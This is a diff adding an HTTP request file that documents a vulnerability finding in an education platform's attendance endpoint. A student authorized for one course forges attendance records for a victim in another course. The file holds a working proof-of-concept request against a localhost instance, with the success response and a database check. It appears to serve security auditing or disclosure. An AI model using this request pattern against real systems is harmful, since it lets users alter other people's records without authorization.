@@ -1,0 +1,25 @@
+### VULN-020 — Attendance forgery: authorize on PATH :courseId, mutate on BODY courseId/lessonId/studentId
+### <S> is the session of a STUDENT who is a member of course A only (satisfies courseMemberMiddleware
+### on the PATH course A). The BODY targets a DIFFERENT course B + a victim's groupmember id.
+
+POST http://localhost:21527/course/eb4c14aa-4bf0-4455-a9d9-c5d4325803c2/attendance HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Cookie: classroomio.session_token=<S>
+Content-Type: application/json
+
+{
+  "courseId": "78857e0e-a826-4cad-b0c2-dbc0a66811d7",
+  "lessonId": "adda7077-6c7b-4ac1-a763-08d1215ee819",
+  "studentId": "deb72664-1a2c-46ee-ad43-e7b6b5882436",
+  "isPresent": false
+}
+
+### Response: HTTP 201
+### { "success": true, "data": { "id": 1, "courseId": "78857e0e-...(course B)",
+###     "studentId": "deb72664-...(victim groupmember)", "isPresent": false, ... } }
+###
+### group_attendance.student_id is a FK to groupmember.id; lesson_id has NO FK (any uuid accepted).
+### Ground truth (psql): a group_attendance row now exists for (course B, victim groupmember, lesson)
+### written by an actor who has no role in course B.
